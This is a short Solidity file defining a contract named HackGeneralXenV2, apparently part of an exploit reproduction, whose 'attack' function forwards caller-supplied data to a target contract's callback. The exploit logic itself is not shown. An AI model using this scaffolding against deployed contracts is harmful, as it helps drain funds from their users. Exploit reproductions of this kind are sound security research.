// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IHackGeneralXenV2{
    function callback(address target, bytes memory data) external;
}

contract HackGeneralXenV2 {
    function attack(address target, bytes memory data) external {
        IHackGeneralXenV2(target).callback(target, data);
    }
}